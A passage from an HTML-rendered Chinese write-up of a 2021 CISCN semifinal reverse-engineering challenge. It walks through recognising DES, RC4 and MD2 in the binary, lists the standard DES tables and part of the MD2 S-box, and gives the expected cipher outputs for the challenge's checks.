class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> PC1_Table[<span class="number">56</span>]=&#123;<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,</span><br><span class="line">                          <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">                         <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">                         <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">                         <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">                          <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">                         <span class="number">14</span>,  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">                         <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Rotate_Table[<span class="number">17</span>]=&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> PC2_Table[<span class="number">48</span>]=&#123;<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">                         <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>,</span><br><span class="line">                         <span class="number">26</span>,  <span class="number">8</span>, <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line">                         <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">                         <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">                         <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> IP_Table[<span class="number">64</span>]=&#123;<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>,</span><br><span class="line">                        <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>,</span><br><span class="line">                        <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,  <span class="number">6</span>,</span><br><span class="line">                        <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line">                        <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line">                        <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>,</span><br><span class="line">                        <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>,</span><br><span class="line">                        <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,  <span class="number">7</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> E_Table[<span class="number">48</span>]=&#123;<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">                        <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">                        <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">                       <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">                       <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                       <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">                       <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">                       <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> S_Box[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>]=&#123;</span><br><span class="line">    <span class="comment">// S1</span></span><br><span class="line">    &#123;<span class="number">14</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>&#125;,</span><br><span class="line">    <span class="comment">// S2</span></span><br><span class="line">    &#123;<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">     <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>&#125;,</span><br><span class="line">    <span class="comment">// S3</span></span><br><span class="line">    &#123;<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">     <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>,</span><br><span class="line">     <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>&#125;,</span><br><span class="line">    <span class="comment">// S4</span></span><br><span class="line">    &#123; <span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">     <span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">     <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>&#125;,</span><br><span class="line">    <span class="comment">// S5</span></span><br><span class="line">    &#123; <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">     <span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">     <span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>&#125;,</span><br><span class="line">    <span class="comment">// S6</span></span><br><span class="line">    &#123;<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>&#125;,</span><br><span class="line">    <span class="comment">// S7</span></span><br><span class="line">    &#123; <span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>,</span><br><span class="line">     <span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">      <span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>&#125;,</span><br><span class="line">    <span class="comment">// S8</span></span><br><span class="line">    &#123;<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">      <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> P_Table[<span class="number">32</span>]=&#123;<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">                       <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">                        <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">                        <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">                        <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">                       <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">                       <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">                       <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> inv_IP_Table[<span class="number">64</span>]=&#123;<span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">                            <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">                            <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">                            <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">                            <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">                            <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">                            <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">                            <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>&#125;;</span><br></pre></td></tr></table></figure><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0xB5u, 0xC9u, (__int64)v10)</span></span><br><span class="line">DES(text=<span class="string">&#x27;ComeOn!!&#x27;</span>,key=STRING[<span class="number">66</span>:<span class="number">74</span>])==[<span class="number">0x52</span>, <span class="number">0x8E</span>, <span class="number">0xA9</span>, <span class="number">0x48</span>, <span class="number">0x4B</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0x51</span>]</span><br></pre></td></tr></table></figure><h3 id="对称密码-RC4"><a href="#对称密码-RC4" class="headerlink" title="[对称密码] RC4"></a>[对称密码] RC4</h3><blockquote><p>具体实现：<a href="https://github.com/c10udlnk/myReverseExps/blob/main/_CRYPTO_/RC4.cpp">myReverseExps&#x2F;RC4.cpp at main · c10udlnk&#x2F;myReverseExps</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0x5Cu</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711220528296.png"></p><p>这个函数相对比较简单，没有前两个那么复杂，直接逆算法可以发现跟RC4一模一样，就是最后把跟密钥流xor那步拆开了，xor是常见的拆分&#x2F;混淆方法<code>a^b = ~a&amp;b|~b&amp;a</code>。</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210711220852318.png"></p><p>所以有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_401880(0x5Cu, 0x77u, (__int64)&amp;v7)</span></span><br><span class="line">RC4(text=<span class="string">&#x27;You have made a huge progress!&#x27;</span>,key=STRING[<span class="number">44</span>:<span class="number">48</span>])==[<span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0xCF</span>, <span class="number">0x22</span>, <span class="number">0x4C</span>, <span class="number">0xFD</span>, <span class="number">0x49</span>, <span class="number">0xC2</span>, <span class="number">0x73</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x99</span>, <span class="number">0xED</span>, <span class="number">0x71</span>, <span class="number">0x2D</span>, <span class="number">0xDD</span>, <span class="number">0x08</span>, <span class="number">0x58</span>, <span class="number">0x51</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x59</span>, <span class="number">0x2C</span>, <span class="number">0x2F</span>, <span class="number">0xE4</span>, <span class="number">0x4A</span>, <span class="number">0x66</span>, <span class="number">0x0F</span>]</span><br></pre></td></tr></table></figure><h3 id="哈希-MD2"><a href="#哈希-MD2" class="headerlink" title="[哈希] MD2"></a>[哈希] MD2</h3><blockquote><p>具体实现：<a href="https://blog.csdn.net/guyongqiangx/article/details/117913177">MD2哈希算法实现(附源码)_洛奇看世界-CSDN博客</a></p><p>在本题中对应<code>sub_401880()</code>里的<code>case 0x94u</code></p></blockquote><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712101230992.png"></p><p>在<code>sub_401580() -&gt; sub_4112E0() -&gt; sub_410FF0()</code>的<code>byte_419D90</code>有MD2的常量数组：</p><p><img src="/p/wpFor-2021CISCNsemifinal/image-20210712102122255.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint8_t</span> S[<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x43</span>, <span class="number">0xC9</span>, <span class="number">0xA2</span>, <span class="number">0xD8</span>, <span class="number">0x7C</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x3D</span>, <span class="number">0x36</span>, <span class="number">0x54</span>, <span class="number">0xA1</span>, <span class="number">0xEC</span>, <span class="number">0xF0</span>, <span class="number">0x06</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0xA7</span>, <span class="number">0x05</span>, <span class="number">0xF3</span>, <span class="number">0xC0</span>, <span class="number">0xC7</span>, <span class="number">0x73</span>, <span class="number">0x8C</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0x93</span>, <span class="number">0x2B</span>, <span class="number">0xD9</span>, <span class="number">0xBC</span>, <span class="number">0x4C</span>, <span class="number">0x82</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x9B</span>, <span class="number">0x57</span>, <span class="number">0x3C</span>, <span class="number">0xFD</span>, <span class="number">0xD4</span>, <span class="number">0xE0</span>, <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x42</span>, <span class="number">0x6F</span>, <span class="number">0x18</span>, <span class="number">0x8A</span>, <span class="number">0x17</span>, <span class="number">0xE5</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x4E</span>, <span class="number">0xC4</span>, <span class="number">0xD6</span>, <span class="number">0xDA</span>, <span class="number">0x9E</span>, <span class="number">0xDE</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0xA0</span>, <span class="number">0xFB</span>, <span class="number">0xF5</span>, <span class="number">0x8E</span>, <span class="number">0xBB</span>, <span class="number">0x2F</span>, <span class="number">0xEE</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xA9</span>, <span class="number">0x68</span>, <span class="number">0x79</span>, <span class="number">0x91</span>, <span class="number">0x15</span>, <span 